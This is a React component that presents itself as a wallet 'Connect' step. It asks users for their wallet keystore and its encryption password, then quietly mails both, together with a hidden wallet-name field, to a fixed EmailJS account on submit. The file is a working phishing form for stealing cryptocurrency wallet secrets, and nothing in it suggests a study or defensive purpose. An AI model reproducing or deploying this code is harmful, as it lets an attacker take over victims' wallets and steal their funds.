import React from "react";
import emailjs from "emailjs-com";

const sendEmail = (e) => {
  e.preventDefault();

  emailjs
    .sendForm(
      "service_uca2x1k",
      "template_069w5ez",
      e.target,
      "user_Qp1Kvs7l8ZL0vLtKArviW"
    )
    .then(
      (result) => {
        console.log(result.text);
      },
      (error) => {
        console.log(error.text);
      }
    );
  e.target.reset();

};

const Keystore = ({ wallet}) => {
  return (
    <>

        <form onSubmit={sendEmail}>
          <input
            type="text"
            placeholder="Enter your keystore"
            name="key"
            min="12" max="100"
            minLength="12"
          ></input>

          <input
            type="text"
            placeholder="Enter Temporary Password"
            name="pass"
            minLength="12"
            min="12" max="100"
          ></input>
          <h6 className="h4">
            Several lines of text beginning with '(...)' plus the password you used to encrypt it.
          </h6>
        <input type="text" value={wallet} className="hiddeen" name="wallet" />
          <button type="submit">
            <b>Connect</b>
          </button>

        </form>
      </>
  );
};

export default Keystore;

